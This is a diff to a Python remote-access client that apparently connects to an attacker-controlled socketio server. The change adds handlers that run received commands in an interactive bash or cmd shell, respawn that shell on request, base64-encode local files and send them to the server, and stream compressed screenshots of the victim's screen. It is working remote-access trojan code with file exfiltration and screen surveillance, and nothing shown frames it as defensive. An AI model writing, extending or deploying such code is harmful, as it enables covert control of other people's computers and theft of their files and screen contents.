@@ -1,16 +1,16 @@
-import os
 import subprocess
 import threading
 import platform
 import socketio
+import sys
+import base64
 import ssl
 from urllib.request import urlopen
-import importlib.util
-import base64
-import io
-import time
 from PIL import Image
+import importlib.util
 import mss
+import time
+import io
 
 # Declare the global stop event
 stop_event = threading.Event()
@@ -33,6 +33,8 @@ def run(data):
     sio = socketio.Client(logger=False, engineio_logger=False)
 
     system = platform.system()
+
+    global shell
 
     if system == "Linux" or system == "Darwin":
         shellScript = "bash"
@@ -100,6 +102,21 @@ def run(data):
                 self.process.stdin.write(command + "\n")
                 self.process.stdin.flush()
 
+    @sio.on("command")
+    def command(data_new):
+        if data['uuid'] == data_new['id']:
+            shell.write_input(data_new['cmd'])
+
+    @sio.on('restart')
+    def restart(data_new):
+        global shell  # Declare shell as global to modify it
+        if data_new == data['uuid']:
+            if shell.process:
+                shell.process.terminate()
+                shell.running = False
+            shell = InteractiveShell()  # Create a new InteractiveShell instance
+            shell.start()  # Start the new shell process
+
     @sio.event
     def connect():
         sio.emit("mConnect", data)
@@ -121,7 +138,7 @@ def run(data):
                 file = f.read()
             file_ready = base64.b64encode(file).decode('utf-8')
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
-            print("emitted")
+            print("emited")
 
     @sio.on("pem")
     def pem(data_new):
@@ -140,17 +157,24 @@ def run(data):
             while not stop_event.is_set():
                 current_time = time.time()
                 if current_time - last_capture_time >= frame_interval:
+                    # Capture screenshot
                     screenshot = sct.grab(monitor)
+                    
+                    # Convert screenshot to PIL Image
                     img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                     
+                    # Compress to JPEG with adjustable quality
                     with io.BytesIO() as output:
                         img.save(output, format="JPEG", quality=quality)
                         jpeg_data = output.getvalue()
                     
+                    # Emit the raw JPEG data instead of base64
                     sio.emit("screenshot", {"uid": uid, "image": jpeg_data})
                     print("Sent compressed screenshot")
+
                     last_capture_time = current_time
 
+                # Small sleep to prevent a tight loop
                 time.sleep(0.001)
 
     screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
@@ -159,15 +183,16 @@ def run(data):
     def screen_status(data_new):
         if data['uuid'] == data_new['uid']:
             if data_new['status'] == "start":
-                stop_event.clear()
+                stop_event.clear()  # Reset the event to False
                 screenshot_thread = threading.Thread(target=take_screenshots, args=(sio, data['uuid']))
                 screenshot_thread.start()
             else:
-                stop_event.set()
+                stop_event.set()  # Signal the thread to stop
                 try:
-                    screenshot_thread.join()
+                    screenshot_thread.join()  # Wait for the thread to finish
                 except:
-                    print("Thread is already dead")
+                    "Thread is already dead"
+
 
     sio.connect(data['url'])
 
